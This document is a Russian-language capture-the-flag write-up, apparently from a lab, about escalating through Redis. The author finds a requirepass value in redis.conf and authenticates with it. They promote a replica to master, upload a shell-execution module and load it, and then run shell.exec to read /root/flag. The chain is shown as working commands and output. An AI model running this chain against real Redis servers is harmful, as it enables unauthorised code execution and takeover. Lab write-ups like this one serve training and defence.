## Смотреть прошлый рейтап

После того как мы получили юзера и получили флаг , я увидел что там есть redis.conf

Сразу скачал его себе на комп и грепнул pass
```
└─$ cat redis.conf| grep "pass"
# 2) No password is configured.
# If the master is password protected (using the "requirepass" configuration
# masterauth <master-password>
# resync is enough, just passing the portion of data the replica missed while
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
requirepass NTO_r3d15_p455w0rd
````


Сразу же понял что это пароль от редиса
```
└─$ redis-cli -h 10.10.1.110
10.10.1.110:6379> AUTH NTO_r3d15_p455w0rd
OK
```
Начал думать как мне повысится, погуглил и понял что у меня роль `slave`, что бы повысится до `master` мне нужно было выполнить следующие команды

```
┌──(kali㉿kaliOlymp)-[~]
└─$ redis-cli -h 10.10.1.110
10.10.1.110:6379> AUTH NTO_r3d15_p455w0rd
OK
10.10.1.110:6379> SLAVEOF NO ONE 
OK
10.10.1.110:6379> CONFIG SET masterauth "marcus"
OK
10.10.1.110:6379> CONFIG SET slave-read-only no 
OK
10.10.1.110:6379> CONFIG REWRITE
OK
10.10.1.110:6379> INFO replication 
# Replication
role:master
connected_slaves:0
master_replid:80a7419348cc395265be4d80210c6d96442e4b50
master_replid2:88eb7e990ec42c64f45bd09fe70ea6bb29b8394b
master_repl_offset:0
second_repl_offset:1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0
10.10.1.110:6379> 
```

После этого я подумал как мне можно выполнять команды, и понял что нужно юзать модули, а что бы их заюзать их сначала нужно импортнуть и загрузить. 
Нашел модуль для выполнения кода (RCE)

И загрузил его через ftp

`put redis_module.so /tmp/redis_module.so`

И в редисе выполнил
```
127.0.0.1:6379> CONFIG SET dir /tmp/
OK
127.0.0.1:6379> CONFIG SET dbfilename redis_module.so
OK
127.0.0.1:6379> MODULE LOAD /tmp/redis_module.so
OK
```
А далее просто 

```
127.0.0.1:6379> shell.exec 'cat /root/flag'
```
